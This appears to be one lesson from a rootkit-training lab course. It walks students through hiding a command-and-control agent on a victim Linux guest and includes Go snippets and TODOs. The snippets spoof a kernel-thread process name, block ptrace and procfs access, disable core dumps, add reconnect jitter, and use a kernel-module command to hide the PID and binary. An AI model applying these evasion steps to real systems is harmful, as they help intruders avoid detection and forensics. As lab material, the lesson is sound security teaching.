# L23: Process Masquerade

## Mission

L22 routes browsers to the decoy page, but the agent still exposes its process
name and regular reconnect interval.
This exercise:

- Changes the process name
- Disables core dumps
- Adds reconnect jitter

These controls reduce obvious indicators; they do not make a userspace process
indistinguishable from a kernel thread.

## What you will observe

The agent keeps running, but its ordinary process name changes and peer
processes can no longer read its mappings:

```console
student@victim:~$ cat /proc/412/comm
[kworker/0:1]
student@victim:~$ cat /proc/412/maps
cat: /proc/412/maps: Permission denied
```

The bracketed name is camouflage, not a conversion into a kernel thread.

## Workspace

```text
exercises/L23-process-masquerade
├── go.mod
├── go.sum
└── main.go
```

Complete the process controls, reconnect timing, and post-connect hiding in
`main.go`.

## How process masquerade works

Every Linux thread has a 16-byte name stored in the kernel task structure
(TASK_COMM_LEN).
Tools like `ps`, `top`, and `/proc/pid/comm` read this name to identify running
processes.
The `prctl(PR_SET_NAME)` system call lets any process overwrite its own name at
runtime.

Kernel worker threads appear as `[kworker/0:1]` in process listings:

- The brackets are part of the stored name, not display formatting
- The kernel adds them for threads that have no userspace memory mapping
- A userspace process that sets its name to `[kworker/0:1]` looks like a
  kernel thread in `ps`, but the kernel still knows it is a regular process
- `[kworker/0:1]` is 13 characters, which fits in TASK_COMM_LEN (16 bytes
  including the null terminator)

In Go, `unix.Prctl` from `golang.org/x/sys/unix` wraps the prctl syscall:

```go
var name [16]byte
copy(name[:], "[kworker/0:1]")
unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&name[0])), 0, 0, 0)
```

## Prevent useful core dumps

Two settings prevent core dumps from leaking memory contents:

```go
// Prevent ptrace and /proc/pid/mem access
unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)

// Set core dump size limit to zero
unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})
```

`PR_SET_DUMPABLE` set to 0 restricts ptrace-style access and sensitive procfs
files for unprivileged peers.
Combined with the core limit, a crash produces no dump file.

## Vary the reconnect interval

A fixed reconnect interval (e.g., every 60 seconds) creates a detectable
pattern in network logs.
Adding random jitter makes the timing irregular:

```go
import "crypto/rand"

func jitter(base, spread time.Duration) time.Duration {
    var buf [8]byte
    rand.Read(buf[:])
    offset := time.Duration(binary.LittleEndian.Uint64(buf[:]) % uint64(spread))
    return base + offset
}
```

Use `crypto/rand`, not `math/rand`. `math/rand` is deterministic and seeded
predictably.

## Hide before connecting

After applying process controls, the agent uses the mkdir command interface
(introduced in L05) to tell the kernel module to hide its own artifacts.
`os.Mkdir` with the appropriate prefix triggers the kernel interception, just as
it does in L16's bridge:

```text
  agent starts
       |
       v
  prctl PR_SET_NAME "[kworker/0:1]"
  prctl PR_SET_DUMPABLE 0
  setrlimit RLIMIT_CORE 0
       |
       v
  mkdir rklings.h.i.<own-pid>     # hide from ps
  mkdir rklings.h.f.<binary-name> # hide the binary from ls
       |
       v
  begin WebSocket session loop with jitter
```

## TODOs

```text
TODO 1  main.go:26:2   masquerade as a kernel thread
TODO 2  main.go:28:2   prevent /proc/pid/mem access
TODO 3  main.go:30:2   prevent core dumps
TODO 4  main.go:38:3   auto-hide PID and binary path
TODO 5  main.go:67:1   implement jitter with crypto/rand
```

### TODO 1 -- Masquerade as a kernel thread

Copy the target name into a `[16]byte` array and pass its first element to
`unix.Prctl` with `unix.PR_SET_NAME`.
The name must fit in TASK_COMM_LEN (16 bytes including the null terminator).

### TODO 2 -- Prevent /proc/pid/mem access

Call `unix.Prctl` with `unix.PR_SET_DUMPABLE` set to 0.

### TODO 3 -- Prevent core dumps

Call `unix.Setrlimit` with `unix.RLIMIT_CORE` and both `Cur` and `Max` set to 0.

### TODO 4 -- Auto-hide PID and binary path

Before starting the WebSocket loop, issue two `os.Mkdir` calls:

1. `rklings.h.i.<pid>` to hide the process from `ps`.
2. `rklings.h.f.<binary>` to hide the agent binary from directory listings.

Use `os.Getpid()` for the PID and `filepath.Base(os.Args[0])` for the binary
name.

### TODO 5 -- Implement jitter with crypto/rand

Read 8 bytes from `rand.Read` (the `crypto/rand` package), decode them as a
little-endian uint64, and take the modulus with the spread duration.
Return `base` plus that offset.

## Test it

```console
$ ./rklings run L23
```

`run` starts the agent in the background.
Inspect it inside the guest:

```console
student@victim:~$ ps aux | grep kworker
root         7  0.0  0.0      0     0 ?  I    00:00 [kworker/0:0]
student    412  0.0  0.1   5432  3210 ?  S    00:01 [kworker/0:1]
```

The agent appears as `[kworker/0:1]` in `ps`. A real kworker has zero RSS and
VSZ (it lives in kernel memory). The agent's nonzero values are a giveaway.

```console
student@victim:~$ cat /proc/412/comm
[kworker/0:1]
student@victim:~$ cat /proc/412/maps
cat: /proc/412/maps: Permission denied
```

`/proc/pid/maps` is blocked because dumpable is 0.

## Validate

```console
$ ./rklings validate L23
  [+] process comm is [kworker/0:1]
  [+] process is not dumpable and core dumps disabled
  [+] agent auto-hides its PID on connect
  [+] reconnect interval varies between connections
  PASS
```

## Next

The process is less obvious, but the deployment still leaves timestamps, shell
commands, login records, and journal entries.
L24 identifies and clears those local records.
